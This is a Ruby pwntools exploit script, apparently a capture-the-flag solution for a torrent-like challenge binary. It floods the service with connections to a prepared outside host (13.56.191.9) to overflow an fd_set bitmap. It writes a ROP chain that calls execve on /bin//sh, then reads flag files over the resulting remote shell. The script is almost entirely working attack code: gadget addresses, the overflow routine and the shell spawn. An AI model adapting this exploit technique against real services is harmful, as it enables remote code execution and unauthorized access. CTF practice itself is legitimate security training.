#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pwn'        # https://github.com/peter50216/pwntools-ruby

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '34.214.75.168', 4747
@local = false
@p = './shitorrent'
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  $z = Tubes::Process.new(@p)
else
  raise ArgumentError, 'host not set' if host.empty?
  $z = Sock.new host, port
end
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pt;
  z.gets '[g]et flag'
end

@h = '13.56.191.9' # our prepared host

@cmt = 0
def add(pp)
  @cmt += 1
  if @cmt >= 100
    @cmt.times { pt }
    @cmt = 0
  end
  # pt
  z.puts 'a'
  # z.gets 'host'
  z.write @h.ljust(99, "\x00")
  # z.gets 'port'
  z.write pp.to_s.ljust(99, "\x00")
end

def add_listener
  add(60000)
end

def add_admin
  add(60001)
end

def remove(id)
  @cmt += 1
  if @cmt >= 10
    @cmt.times { pt }
    @cmt = 0
  end
  # pt
  z.puts 'r'
  # z.puts id
  z.write id.to_s.ljust(255, "\x00")
end

log.info 'listener'
(1216-3).times {|i| 
  add_listener 
}
@cmt.times { pt }
@cmt = 0
fd = 1216
rop = [
  0x0000000000407888, # pop rsi ; ret
  0x00000000006da0e0, # @ .data
  0x00000000004657fc, # pop rax ; ret
  '/bin//sh'.u64,
  0x00000000004055c1, # mov qword ptr [rsi], rax ; ret
  0x0000000000407888, # pop rsi ; ret
  0x00000000006da0e8, # @ .data + 8
  0x0000000000460b90, # xor rax, rax ; ret
  0x00000000004055c1, # mov qword ptr [rsi], rax ; ret
  0x0000000000400706, # pop rdi ; ret
  0x00000000006da0e0, # @ .data
  0x0000000000407888, # pop rsi ; ret
  0x00000000006da0e8, # @ .data + 8
  0x0000000000465855, # pop rdx ; ret
  0x00000000006da0e8, # @ .data + 8
  0x00000000004657fc, # pop rax ; ret
  59,
  0x0000000000490ec5, # syscall
  0xdeaddeadbeef
]
log.info 'admin'
(rop.size * 64).times { |i|
  add_admin 
}
@cmt.times { pt }
@cmt = 0
log.info 'removing'
rop.each do |c|
  p c.hex
  64.times do |i|
    if c[i] == 0
      remove(fd)
    end
    fd += 1
  end
end
@cmt.times { pt }
@cmt = 0

z.puts 'q'
z.puts 'ls -la; cat /flag flag flag.txt /flag.txt'
z.interact

# OOO{i did not read the fd_set manpage}
